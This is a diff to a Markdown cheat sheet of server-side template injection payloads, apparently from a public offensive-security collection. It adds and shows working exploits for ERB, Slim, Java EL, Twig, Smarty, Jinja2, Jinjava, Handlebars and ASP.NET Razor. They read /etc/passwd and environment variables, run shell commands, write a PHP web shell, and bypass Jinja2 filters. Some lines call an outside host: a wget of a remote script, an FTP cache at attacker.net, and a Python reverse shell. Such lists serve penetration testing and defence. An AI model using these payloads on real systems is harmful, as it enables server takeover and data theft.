@@ -7,16 +7,20 @@
 * [Tools](#tools)
 * [Methodology](#methodology)
 * [Ruby](#ruby)
-  * [Basic injection](#basic-injection)
+  * [Basic injections](#basic-injections)
   * [Retrieve /etc/passwd](#retrieve--etc-passwd)
   * [List files and directories](#list-files-and-directories)
 * [Java](#java)
   * [Basic injection](#basic-injection)
   * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
   * [Retrieve /etc/passwd](#retrieve--etc-passwd)
+* [Expression Language EL](#expression-language-el)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
 * [Twig](#twig)
   * [Basic injection](#basic-injection)
   * [Template format](#template-format)
+  * [Arbitrary File Reading](#arbitrary-file-reading)
   * [Code execution](#code-execution)
 * [Smarty](#smarty)
 * [Freemarker](#freemarker)
@@ -31,6 +35,7 @@
 * [Jinja2](#jinja2)
   * [Basic injection](#basic-injection)
   * [Template format](#template-format)
+  * [Debug Statement](#debug-statement)
   * [Dump all used classes](#dump-all-used-classes)
   * [Dump all config variables](#dump-all-config-variables)
   * [Read remote file](#read-remote-file)
@@ -38,6 +43,10 @@
   * [Remote Code Execution](#remote-code-execution)
   * [Filter bypass](filter-bypass)
 * [Jinjava](#jinjava)
+  * [Basic injection](#basic-injection)
+  * [Command execution](#command-execution)
+* [Handlebars](#handlebars)
+* [ASP.NET Razor](#aspnet-razor)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
 * [References](#references)
@@ -59,10 +68,18 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ## Ruby
 
-### Basic injection
+### Basic injections
+
+ERB:
 
 ```ruby
 <%= 7 * 7 %>
+```
+
+Slim:
+
+```ruby
+#{ 7 * 7 }
 ```
 
 ### Retrieve /etc/passwd
@@ -75,6 +92,25 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ```ruby
 <%= Dir.entries('/') %>
+```
+
+### Code execution
+
+Execute code using SSTI for ERB engine.
+
+```ruby
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+```
+
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
 ```
 
 ## Java
@@ -103,6 +139,47 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
 
+## Expression Language EL
+
+### Basic injection
+
+```java
+${1+1} 
+#{1+1}
+```
+
+### Code Execution
+
+
+```java
+// Common RCE payloads
+''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
+''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()
+
+// Method using Runtime
+#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
+#{session.getAttribute("rtc").setAccessible(true)}
+#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
+
+// Method using processbuilder
+${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
+${request.getAttribute("c").add("cmd.exe")}
+${request.getAttribute("c").add("/k")}
+${request.getAttribute("c").add("ping x.x.x.x")}
+${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
+${request.getAttribute("a")}
+
+// Method using Reflection & Invoke
+${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
+
+// Method using ScriptEngineManager one-liner
+${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+
+// Method using ScriptEngineManager
+${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
+```
+
+
 ## Twig
 
 ### Basic injection
@@ -110,6 +187,8 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```python
 {{7*7}}
 {{7*'7'}} would result in 49
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
 ```
 
 ### Template format
@@ -126,17 +205,34 @@ $output = $twig > render (
 );
 ```
 
+### Arbitrary File Reading
+
+```python
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+```
+
 ### Code execution
 
 ```python
 {{self}}
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 ```
 
 ## Smarty
 
 ```python
+{$smarty.version}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
@@ -244,6 +340,16 @@ The above injections have been tested on Flask application.
 
 ```
 
+### Debug Statement¶
+
+If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
+
+```python
+<pre>{% debug %}</pre>
+```
+
+Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
+
 ### Dump all used classes
 
 ```python
@@ -297,6 +403,13 @@ nv -lnvp 8000
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
+Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+```
+
 #### Exploit the SSTI by writing an evil config file.
 
 ```python
@@ -344,6 +457,11 @@ Bypassing `|join`
 http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
 ```
 
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+```python
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
 ## Jinjava
 
 ### Basic injection
@@ -370,6 +488,52 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
 
+## Handlebars
+
+### Command Execution
+
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+### References
+
+- [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
+- [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
+
+## ASP.NET Razor
+
+### Basic injection
+
+```powershell
+@(1+2)
+```
+
+### Command execution 
+
+```csharp
+@{
+  // C# code
+}
+```
 
 ## References
 
@@ -386,3 +550,7 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
 * [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
 * [Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+* [Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/)
+* [Expression Language injection - PortSwigger](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
+* [Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab](https://securitylab.github.com/research/bean-validation-RCE)
+* [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
